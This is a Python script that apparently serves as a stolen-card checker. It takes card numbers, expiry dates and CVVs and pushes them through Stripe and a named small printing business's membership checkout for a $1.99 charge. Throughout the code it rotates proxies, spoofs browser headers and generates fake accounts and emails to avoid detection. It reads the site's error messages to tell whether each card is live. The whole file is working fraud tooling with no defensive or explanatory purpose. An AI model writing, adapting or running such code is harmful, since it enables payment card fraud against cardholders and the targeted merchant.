import random,string
from httpx import AsyncClient
from bs4 import BeautifulSoup
from proxy import proxies
def getstr(src, start, end):
    try:
        start_index = src.index(start) + len(start)
        end_index = src.index(end, start_index)
        return src[start_index:end_index]
    except ValueError:
        return None
def generate_username(length=(random.randint(6, 10))):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def generate_password(length=(random.randint(12, 16))):
    return ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=length))

def generate_email():
    username = generate_username()
    domain = random.choice(['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com','aol.com', 'icloud.com'])
    return f'{username}@{domain}'

async def stripe_charge1(cc, mm, yy, cvv):
    if len(yy) == 4:
        yy = yy[-2:]
    last4 = cc[-4:]
    email = generate_email()
    user = generate_username()
    password = generate_password()
    proxy = proxies()
    async with AsyncClient(proxies=proxy , timeout= 10) as r:
        headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }
        response = await r.get('https://cooperfamilyprinting.com/membership-checkout/',headers=headers)
        nonce = getstr(response.text, 'pmpro_checkout_nonce" value="', '"')

        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

        data = {
            "type": "card",
            "card[number]": cc,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "card[cvc]": cvv,
            "guid": "a3b0ef5c-15fa-46a9-bda4-16cdd3608e2b98ead9",
            "muid": "8028159e-423c-4e06-8bd4-2701b57dd32af5722f",
            "sid": "fba791cc-c9f8-4473-9918-8a898c18958a6f7446",
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/064d3d4e55; stripe-js-v3/064d3d4e55; split-card-element",
            "referrer": "https://cooperfamilyprinting.com",
            "key": "pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX",
            "_stripe_account": "acct_18mky7ALfEMNyndi"
        }
        response = await r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        try:
            pm = response.json()['id']
            brand = response.json()['card']['brand']
        except:
            return 'Error: Failed to create payment method.'
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': 'PHPSESSID=b63ca9691a2796f8f034ae0564d08493; pmpro_visit=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-07%2014%3A39%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fcooperfamilyprinting.com%2Fmembership-checkout%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-10-07%2014%3A39%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fcooperfamilyprinting.com%2Fmembership-checkout%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fcooperfamilyprinting.com%2Fmembership-checkout%2F; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; nouvello_utm_cookie_expiry=90; nouvello_utm_sess_visit=1728313795; nouvello_utm_sess_landing=https://cooperfamilyprinting.com/membership-checkout/; nouvello_unique_visitor=1; __stripe_mid=8028159e-423c-4e06-8bd4-2701b57dd32af5722f; __stripe_sid=fba791cc-c9f8-4473-9918-8a898c18958a6f7446',
            'origin': 'https://cooperfamilyprinting.com',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://cooperfamilyprinting.com/membership-checkout/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }
        data = {
            'pmpro_level': '1',
            'checkjavascript': '1',
            'username': user,
            'password': password,
            'password2': password,
            'bemail': email,
            'bconfirmemail': email,
            'fullname': '',
            'CardType': brand,
            'pmpro_checkout_nonce': nonce,
            '_wp_http_referer': '/membership-checkout/',
            'submit-checkout': '1',
            'javascriptok': '1',
            'payment_method_id': pm,
            'AccountNumber': f'XXXXXXXXXXXX{last4}',
            'ExpirationMonth': mm,
            'ExpirationYear': '20' + yy,
        }

        response = await r.post('https://cooperfamilyprinting.com/membership-checkout/',  headers=headers, data=data)
        soup = BeautifulSoup(response.text, 'html.parser')
        error_message = soup.find('div', class_='pmpro_message pmpro_error').text.strip()
        try:
            if error_message:
                return error_message
            else:
                return 'Charged $1.99'
        except:
            return "Unexpected error occurred while processing the payment."
